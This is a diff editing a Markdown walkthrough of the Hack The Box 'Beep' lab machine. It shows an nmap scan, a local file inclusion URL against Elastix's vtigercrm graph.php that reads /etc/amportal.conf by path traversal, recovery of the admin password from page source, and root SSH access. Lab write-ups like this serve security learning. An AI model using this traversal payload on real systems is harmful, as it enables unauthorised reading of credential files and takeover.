@@ -35,9 +35,11 @@ nmap -sS -sV -sC -p- -T4 -Pn -oN fullscan.txt beep
 https://beep   # Elastix Login page
 ```
 
+---
+
 ## 🎯 Exploitation – LFI in Elastix
 ```http
-http://beep/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+http://beep/vtigercrm/graph.php?current_language=../../../../../../../etc/amportal.conf%00&module=Accounts&action
 ```
 
 🔍 View **page source** → search for:
@@ -49,7 +51,7 @@ ctrl + F → password
 
 ### 🧑‍💻 Access Elastix Panel
 - **User:** `admin`  
-- **Password: 
+- **Password:** Found in page source 
 
 ---
 
@@ -85,6 +87,7 @@ cat root.txt
 ## 📝 Notes
 
 - Exploit: LFI via `graph.php` (Elastix)
-- Direct SSH root login (no priv esc needed)
+- Retrieved password from page source 
+- Direct SSH root login (no priv esc needed)  
 ✅ Commands tested and verified  
-
+🚫 Flags hidden for HTB ToS compliance
